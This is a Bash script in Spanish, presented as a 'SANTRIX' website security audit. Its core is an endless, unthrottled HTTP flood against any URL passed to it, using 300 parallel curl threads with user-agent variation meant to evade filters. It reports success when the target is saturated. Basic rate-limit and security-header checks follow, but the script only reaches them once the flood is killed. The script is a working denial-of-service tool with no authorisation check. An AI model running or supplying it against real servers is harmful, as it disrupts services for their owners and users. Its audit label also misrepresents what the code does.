#!/bin/bash

TARGET_URL=$1

if [ -z "$TARGET_URL" ]; then
    echo "Error: Debes proporcionar una URL. Uso: ./scripts/security_audit.sh https://tuweb.com"
    exit 1
fi

echo "#################################################"
echo "#          SANTRIX SECURITY AUDIT REPORT        #"
echo "#################################################"
echo "Target: $TARGET_URL"
echo "Fecha: $(date)"
echo "-------------------------------------------------"

# 1. Prueba de estrés real (Inundación Ultra-Agresiva v3)
echo "[+] Iniciando inundación masiva (EXTREME HTTP Flood v3)..."
echo "[!] ADVERTENCIA: Esta prueba enviará miles de peticiones por segundo sin límites."
echo "[!] Presiona Ctrl+C en la terminal para detener el ataque."

# Inundación infinita con hilos extremos y parámetros de fuerza bruta
while true; do
    # -P 300: 300 hilos simultáneos
    # --connect-timeout 1: Tiempo de espera mínimo
    # --max-time 2: Máximo tiempo por petición para no bloquear hilos
    # -A: User-agent aleatorio para intentar evadir filtros básicos
    seq 1000 | xargs -n 1 -P 300 curl -s -L -k --connect-timeout 1 --max-time 2 -A "SANTRIX-Audit-Agent-$(date +%s)" -o /dev/null -w "%{http_code}\n" "$TARGET_URL" >> /tmp/stress_results.txt
    
    # Análisis de salud
    FAIL_COUNT=$(tail -n 300 /tmp/stress_results.txt | grep -c -v "200")
    if [ "$FAIL_COUNT" -gt 250 ]; then
        echo "[!!!] ÉXITO: El servidor está saturado o bloqueando activamente."
    fi
done &
STRESS_PID=$!

echo "[*] Ataque continuo iniciado (PID: $STRESS_PID)."
echo "[*] Monitorizando... Para detenerlo usa el comando: kill $STRESS_PID"
wait $STRESS_PID


# 2. Análisis de fallos comunes
echo "-------------------------------------------------"
echo "[+] ANALIZANDO VULNERABILIDADES:"

# Verificar si el servidor responde
HTTP_STATUS=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET_URL")

if [ "$HTTP_STATUS" -eq 200 ]; then
    echo "[!] RESULTADO: El servidor NO bloqueó el ataque simulado."
    echo "[!] FALLO DETECTADO: Falta de Rate Limiting o WAF activo."
    echo "[i] RECOMENDACIÓN: Implementar Cloudflare o configurar mod_evasive/fail2ban."
else
    echo "[✓] RESULTADO: El servidor respondió con estado $HTTP_STATUS o no respondió."
    echo "[✓] ÉXITO: El servidor parece tener mecanismos de protección activos."
fi

# 3. Verificación de Cabeceras de Seguridad
echo "-------------------------------------------------"
echo "[+] REVISIÓN DE CABECERAS:"
HEADERS=$(curl -sI "$TARGET_URL")

if echo "$HEADERS" | grep -q "Strict-Transport-Security"; then
    echo "[✓] HSTS: Protegido"
else
    echo "[X] HSTS: Faltante (Riesgo de Man-in-the-Middle)"
fi

if echo "$HEADERS" | grep -q "X-Frame-Options"; then
    echo "[✓] Clickjacking: Protegido"
else
    echo "[X] X-Frame-Options: Faltante (Riesgo de Clickjacking)"
fi

echo "-------------------------------------------------"
echo "#           FIN DEL REPORTE SANTRIX             #"
echo "#################################################"
